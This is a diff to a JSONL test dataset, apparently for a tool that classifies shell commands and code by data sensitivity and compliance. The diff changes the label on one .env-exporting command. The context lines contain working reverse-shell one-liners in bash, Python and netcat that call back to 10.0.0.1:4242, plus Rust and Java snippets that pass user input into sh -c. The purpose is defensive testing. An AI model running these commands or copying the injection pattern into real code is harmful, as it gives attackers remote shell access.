@@ -79,7 +79,7 @@
 {"id":"rs01","category":"reverse_shell","content":"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1","expected_label":"Public","expected_compliant":false,"event_type":"ShellCommand"}
 {"id":"rs02","category":"reverse_shell","content":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'","expected_label":"Public","expected_compliant":false,"event_type":"ShellCommand"}
 {"id":"rs03","category":"reverse_shell","content":"nc -e /bin/sh 10.0.0.1 4242","expected_label":"Public","expected_compliant":false,"event_type":"ShellCommand"}
-{"id":"ci01","category":"config_injection","content":"export $(grep -v '^#' .env | xargs) && curl http://$API_HOST/health","expected_label":"HighlyConfidential","expected_compliant":false,"event_type":"ShellCommand"}
+{"id":"ci01","category":"config_injection","content":"export $(grep -v '^#' .env | xargs) && curl http://$API_HOST/health","expected_label":"Public","expected_compliant":false,"event_type":"ShellCommand"}
 {"id":"ci02","category":"config_injection","content":"source ~/.bashrc && echo $PATH","expected_label":"Public","expected_compliant":true,"event_type":"ShellCommand"}
 {"id":"ml01","category":"multi_lang","content":"use std::process::Command;\nlet output = Command::new(\"sh\")\n    .arg(\"-c\")\n    .arg(format!(\"ls {}\", user_input))\n    .output()?;","expected_label":"Public","expected_compliant":false,"event_type":"FileOperation"}
 {"id":"ml02","category":"multi_lang","content":"Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", \"ls \" + userInput});","expected_label":"Public","expected_compliant":false,"event_type":"FileOperation"}
